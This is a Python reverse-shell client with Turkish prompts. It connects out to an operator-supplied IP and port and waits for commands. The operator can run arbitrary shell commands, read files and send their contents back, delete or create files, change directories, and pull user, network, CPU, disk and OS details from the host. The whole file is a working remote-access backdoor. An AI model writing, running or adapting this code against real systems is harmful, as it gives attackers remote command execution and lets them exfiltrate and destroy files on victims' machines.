import socket
import subprocess
import os
import psutil
from psutil._common import bytes2human
import platform

def get_os_info():
    os_info = """
platform: platform.system(),
version: platform.version()
    
    """
    
    return os_info


def get_cpu_info():
    cpu_info = ""
    for num, percent in enumerate(psutil.cpu_percent(percpu=True)):
        cpu_info += f"CPU{num}: {percent}%\n"
    return cpu_info

def get_memory_info():
    memory_info = ""
    for part in psutil.disk_partitions(all=False):
        if os.name == "nt" and ('cdrom' in part.opts or not part.fstype):
            usage = psutil.disk_usage(part.mountpoint)
            memory_info += f"Device: {part.device}, Total: {bytes2human(usage.total)}, Used: {bytes2human(usage.used)}, Free: {bytes2human(usage.free)}, Use: {usage.percent}%\n"
        elif os.name == "posix" and ('mount' in part.opts or not part.fstype):
            usage = psutil.disk_usage(part.mountpoint)
            memory_info += f"Device: {part.device}, Total: {bytes2human(usage.total)}, Used: {bytes2human(usage.used)}, Free: {bytes2human(usage.free)}, Use: {usage.percent}%\n"
    return memory_info



def get_network_info():
    network_info = ""
    duplex_map = {
        psutil.NIC_DUPLEX_FULL: "full",
        psutil.NIC_DUPLEX_HALF: "half",
        psutil.NIC_DUPLEX_UNKNOWN: "?",
    }
    af_map = {
        socket.AF_INET: 'IPv4',
        socket.AF_INET6: 'IPv6',
    }
    
    interfaces = psutil.net_if_addrs()
    
    for interface, addresses in interfaces.items():
        network_info += f"Ağ Arayüzü: {interface}\n"
        for addr in addresses:
            network_info += f"  Adres Türü: {af_map.get(addr.family, addr.family)}\n"
            network_info += f"  Adres: {addr.address}\n"
            if addr.broadcast:
                network_info += f"    Yayın Adresi: {addr.broadcast}\n"
            if addr.netmask:
                network_info += f"    Ağ Maskesi: {addr.netmask}\n"
    
    return network_info
    

    
def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return f"Error: {result.stderr.strip()}"
    except Exception as e:
        return f"Error: {str(e)}"

def main():
    ip = input("Sunucunun IP adresini giriniz: ")
    port = int(input("Bağlanmak istediğiniz port numarasını giriniz: "))

    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))  
            print("Sunucuya bağlanıldı.")
            
            while True:
                command = s.recv(4096).decode()  
                
                if command.strip() == 'exit':  
                    break

                elif command.strip() == 'execute':
                    komut = s.recv(4096).decode()
                    output = execute_command(komut)
                    s.send(output.encode())

                elif command.strip().startswith('cat'):
                    dosya_adi = command.split(" ")[1]
                    try:
                        with open(dosya_adi, "r") as dosya:
                            icerik = dosya.read()
                        s.sendall(icerik.encode())
                    except FileNotFoundError:
                        s.send("Dosya bulunamadı".encode())
                    except Exception as e:
                        s.send(f"Hata: {str(e)}".encode())

                elif command.strip().startswith('rm') or command.strip().startswith('rm -r'):
                    dosya_adi = command.split(" ")[1]
                    try:
                        os.remove(dosya_adi)
                        s.send(f"{dosya_adi} başarıyla silindi.".encode())
                    except FileNotFoundError:
                        s.send(f"{dosya_adi} bulunamadı".encode())
                    except Exception as e:
                        s.send(f"Hata: {str(e)}".encode())
                        
                elif command.strip().startswith('ls') or command.strip().startswith('dir'):
                    dosyalar = os.listdir()
                    if dosyalar:
                        s.send("\n".join(dosyalar).encode())
                    else:
                        s.send("Dizin boş".encode())

                elif command.strip().startswith('cd'):
                    hedefklasor = command.split(" ")[1]
                    try:
                        os.chdir(hedefklasor)
                        s.send(f"Dizin değiştirildi: {os.getcwd()}".encode())
                    except FileNotFoundError:
                        s.send("Hata: Dizin bulunamadı".encode())
                    except Exception as e:
                        s.send(f"Hata: {str(e)}".encode())

                elif command.strip().startswith('mkdir'):
                    hedefklasor = command.split(" ")[1]
                    try:
                        os.mkdir(hedefklasor)
                        s.send(f"{hedefklasor} başarıyla oluşturuldu.".encode())
                    except FileExistsError:
                        s.send(f"{hedefklasor} zaten var.".encode())
                    except Exception as e:
                        s.send(f"Hata: {str(e)}".encode())
                        
                        
                elif command.strip().startswith("touch") or command.strip().startswith("type nul >"):
                    dosyaisim = command.split(" ")[1]
                    with open(dosyaisim, "w") as dosya:
                        pass
                        
                        
                    s.send("Dosya Oluşturuldu.".encode())
                
                elif command.strip().startswith("echo"):
                    komut_parcalari = command.split(" ")
                    dosya_isim_index = komut_parcalari.index(">>") + 1
                    dosya_isim = komut_parcalari[dosya_isim_index]
                    metin = " ".join(komut_parcalari[1:dosya_isim_index-1])
                    with open(dosya_isim, "a") as dosya:
                        dosya.write(metin)
                        s.send("Metin dosya sonuna eklendi.".encode())

                        
                elif command.strip().startswith("whoami"):
                    cikti = subprocess.run(['whoami'], capture_output=True, text=True)
                    s.send(cikti.stdout.encode())
                    
                elif command.strip().startswith("ifconfig"):
                    x = get_network_info()
                    s.send(x.encode())
                    
                elif command.strip().startswith("cpu"):
                    x = get_cpu_info()
                    s.send(x.encode())
                    
                elif command.strip().startswith("memory"):
                    x = get_memory_info()
                    s.send(x.encode())
                    
                elif command.strip() == 'osinfo':
                    os_info = get_os_info()
                    s.send(str(os_info).encode())

                                                        

            else:
                s.send("Geçersiz komut.".encode())
    
    print("Bağlantı kesildi.")

if __name__ == "__main__":
    main()

